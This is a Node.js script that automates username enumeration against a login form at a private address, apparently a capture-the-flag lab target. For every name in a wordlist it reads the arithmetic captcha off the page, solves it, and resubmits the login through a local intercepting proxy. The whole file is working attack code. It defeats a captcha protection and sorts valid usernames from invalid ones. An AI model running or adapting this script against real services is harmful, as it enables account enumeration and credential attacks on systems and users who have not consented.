//Depending on environment used, you might need to change the file extension from .js to .mjs

import fetch from 'node-fetch';
import { HttpsProxyAgent } from 'https-proxy-agent';
import fs from 'fs';

const proxyAgent = new HttpsProxyAgent('http://127.0.0.1:8080');

// Read usernames from a file and split them into an array
const usernamesFileContent = fs.readFileSync('usernames.txt', 'utf-8');
const usernames = usernamesFileContent.split(/\r?\n/).filter((username) => username.trim() !== '');

// Function to extract the captcha equation from the response text and evaluate it to get the answer
function extractCaptchaAnswer(responseText) {
  const regex = /(\d+)\s*([\+\-\*\/])\s*(\d+)\s*=\s*\?/;
  const match = regex.exec(responseText);
  if (match) {
    const num1 = parseInt(match[1]);
    const operator = match[2];
    const num2 = parseInt(match[3]);
    let answer;
    switch (operator) {
      case '+':
        answer = num1 + num2;
        break;
      case '-':
        answer = num1 - num2;
        break;
      case '*':
        answer = num1 * num2;
        break;
      case '/':
        answer = num1 / num2;
        break;
      default:
        answer = 0; // Set a default value in case of an unknown operator
    }
    return answer;
  }
}

// Function to perform a single fetch request with a username and obtain the captcha answer
async function performFetchRequest(username) {
  try {
    // Initial request to get the response text
    const response = await fetch('http://10.10.157.44/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `username=${username}&password=admin`,
      agent: proxyAgent,
    });
    const responseText = await response.text();

    // Extract captcha answer from the response text
    const captchaAnswer = extractCaptchaAnswer(responseText);
    if (captchaAnswer !== null) {
      // Second request with the captcha value
      const loginResponse = await fetch('http://10.10.157.44/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `username=${username}&password=admin&captcha=${captchaAnswer}`,
        agent: proxyAgent,
      });
      const loginData = await loginResponse.text();
	if (!loginData.includes('Invalid captcha') && !loginData.includes('does not exist')) {
        	console.log(`Password: admin, captcha: ${captchaAnswer}, ${username}`);
      }
	else {
	      console.log(`no such user`);
    }
    }
  } catch (error) {
    console.error(`Username error: ${username}, Error: ${error.message}`);
  }
}

// Function to iterate through the list of usernames and make login requests
async function iterateUsernames() {
  for (const username of usernames) {
    if (username.trim() !== '') {
	  await performFetchRequest(username);
    }
  }
}

// Start the iteration with the list of usernames
iterateUsernames();
